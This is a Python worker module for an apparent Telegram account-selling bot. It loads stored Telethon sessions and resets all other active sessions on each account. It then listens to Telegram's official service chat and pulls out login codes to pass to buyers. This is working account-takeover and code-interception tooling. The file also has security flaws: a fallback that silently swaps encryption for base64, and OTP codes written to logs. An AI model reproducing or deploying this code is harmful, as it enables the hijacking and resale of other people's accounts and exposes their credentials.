import re
import asyncio
import logging
import datetime
from typing import Optional, Dict, Any
from base64 import b64encode, b64decode

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetAuthorizationsRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.errors import FloodWaitError, SessionPasswordNeededError

from marketplace_bot.config import settings
from marketplace_bot.models import AccountStatus

# Try to load cryptography for secure DB storage of Telethon session strings
try:
    from cryptography.fernet import Fernet
except ImportError:
    # Fallback structure if cryptography is missing at runtime (helps initial builds)
    class FernetFallback:
        def __init__(self, key: str):
            pass
        def encrypt(self, data: bytes) -> bytes:
            return b64encode(data)
        def decrypt(self, data: bytes) -> bytes:
            return b64decode(data)
    Fernet = FernetFallback


logger = logging.getLogger("telethon_worker")


class TelegramSessionEncryptor:
    """
    Encrypts/Decrypts Telethon string sessions prior to database write,
    preventing hackers or DB-leak compromises from gaining full access to accounts.
    """
    def __init__(self, key: Optional[str] = None):
        if not key:
            key = settings.ENCRYPTION_KEY
        self.fernet = Fernet(key.encode() if isinstance(key, str) else key)

    def encrypt_session(self, session_str: str) -> str:
        if not session_str:
            return ""
        encrypted_bytes = self.fernet.encrypt(session_str.encode("utf-8"))
        return encrypted_bytes.decode("utf-8")

    def decrypt_session(self, encrypted_session_str: str) -> str:
        if not encrypted_session_str:
            return ""
        decrypted_bytes = self.fernet.decrypt(encrypted_session_str.encode("utf-8"))
        return decrypted_bytes.decode("utf-8")


class TelethonWorkerManager:
    """
    Worker engine to handle account safety scans, background retries,
    and automatic code capture upon client purchase.
    """
    def __init__(self, auth_code_callback=None):
        self.encryptor = TelegramSessionEncryptor()
        self.active_clients: Dict[str, TelegramClient] = {}
        self.auth_code_callback = auth_code_callback  # Callback to notify aiogram bot of incoming code

    def _get_client(self, phone: str, api_id: int, api_hash: str, session_str_decrypted: str) -> TelegramClient:
        if phone in self.active_clients:
            return self.active_clients[phone]

        # Use StringSession if session string is provided, otherwise fall back to local sqlite session via phone path
        if session_str_decrypted:
            session = StringSession(session_str_decrypted)
        else:
            session = phone

        client = TelegramClient(
            session=session,
            api_id=api_id,
            api_hash=api_hash,
            device_model="Marketplace Automation Engine",
            system_version="1.0.0",
            app_version="BotWorker v1"
        )
        self.active_clients[phone] = client
        return client

    async def execute_security_cleanup(self, phone: str, api_id: int, api_hash: str, encrypted_session: str) -> tuple[bool, str]:
        """
        Connects to Telethon session, verifies credentials, and issues an API request
        to terminate all third-party devices and active sessions from the account.
        """
        logger.info(f"Starting security cleanup for: {phone}")
        try:
            decrypted_session = self.encryptor.decrypt_session(encrypted_session) if encrypted_session else ""
        except Exception as e:
            logger.warning(f"Failed to decrypt database session string for {phone}: {e}. Falling back to default session file.")
            decrypted_session = ""

        client = self._get_client(phone, api_id, api_hash, decrypted_session)

        try:
            # Ensure connected
            await client.connect()
            
            if not await client.is_user_authorized():
                logger.warning(f"Session is invalid or expired for {phone}")
                return False, "Not Authorized / Session Expired"

            # 1. Fetch current authorizations/logged-in devices
            authorizations_res = await client(GetAuthorizationsRequest())
            authorizations = authorizations_res.authorizations
            
            logger.info(f"Account {phone} has {len(authorizations)} active sessions.")

            # If there's more than just this session, send terminate request
            if len(authorizations) > 1:
                logger.info(f"Terminating all sessions for {phone} except the primary automation task...")
                try:
                    # Reset all authorizations. Telegram normally restricts this until 24 hrs has elapsed.
                    # This tells the worker if it can succeed immediately or must delay.
                    await client(ResetAuthorizationsRequest())
                    logger.info(f"Successfully terminated other sessions for {phone}")
                except FloodWaitError as fwe:
                    logger.warning(f"Terminating sessions limited by Telegram. FloodWait duration: {fwe.seconds}s")
                    return False, f"Flood limit hit: Retry in {fwe.seconds}s"
                except Exception as e:
                    logger.warning(f"ResetAuthorizationsRequest failed: {e}. Retrying via scheduler in 30m.")
                    return False, f"Terminate call failed: {str(e)}"

                # Refresh authorizations check
                refreshed_auth = await client(GetAuthorizationsRequest())
                if len(refreshed_auth.authorizations) > 1:
                    return False, "Action queued. Remaining peer sessions require Telegram safety-delay check."

            # If session count is exactly 1 (meaning only us), security cleanup succeeded
            logger.info(f"Security cleanup completed. Account {phone} is completely secure!")
            return True, "Success"

        except Exception as e:
            logger.exception(f"Unexpected worker error while parsing account {phone}")
            return False, f"Worker Error: {str(e)}"

        finally:
            # Keep client connected to hear purchase codes, but if cleaning failed due to invalid session we disconnect
            pass

    async def start_login_code_interception(self, phone: str, api_id: int, api_hash: str, encrypted_session: str, order_id: int):
        """
        Activates real-time event listener to catch incoming codes from Telegram (user id 777000)
        and passes the results back to the core Bot UI.
        """
        try:
            decrypted_session = self.encryptor.decrypt_session(encrypted_session) if encrypted_session else ""
        except Exception as e:
            logger.warning(f"Cannot decrypt session for {phone}: {e}. Falling back to default session file.")
            decrypted_session = ""

        client = self._get_client(phone, api_id, api_hash, decrypted_session)
        await client.connect()

        if not await client.is_user_authorized():
            logger.error(f"Interception failed because account {phone} is not logged in!")
            return

        @client.on(events.NewMessage(chats=777000)) # ID 777000 is always Telegram Official Security Service
        async def handler(event):
            message_text = event.message.message
            logger.info(f"Intercepted login session notice for order {order_id} (phone: {phone}): {message_text}")
            
            # Telegram code format: "Your login code: 12345" or similar format in Russian/English/etc.
            # Match 5 or 6 digit codes
            pattern = re.compile(r'\b(\d{5,6})\b')
            match = pattern.search(message_text)
            
            if match:
                extracted_code = match.group(1)
                logger.info(f"SUCCESS: Extracted Telegram entry OTP code: {extracted_code}")
                
                # Forward to our core dispatcher/callback
                if self.auth_code_callback:
                    if asyncio.iscoroutinefunction(self.auth_code_callback):
                        await self.auth_code_callback(order_id, phone, extracted_code)
                    else:
                        self.auth_code_callback(order_id, phone, extracted_code)
            else:
                logger.warning(f"Intercepted message from Telegram official post, but no 5-6 digit code matched.")

        logger.info(f"Interception active and listening on Telethon client events for: {phone}")

    async def stop_interception(self, phone: str):
        if phone in self.active_clients:
            client = self.active_clients[phone]
            await client.disconnect()
            del self.active_clients[phone]
            logger.info(f"Disconnected and removed Telethon listener client for phone: {phone}")


_telethon_manager: Optional[TelethonWorkerManager] = None


def get_telethon_manager() -> TelethonWorkerManager:
    global _telethon_manager
    if _telethon_manager is None:
        _telethon_manager = TelethonWorkerManager()
    return _telethon_manager


def set_auth_code_callback(callback) -> None:
    manager = get_telethon_manager()
    manager.auth_code_callback = callback
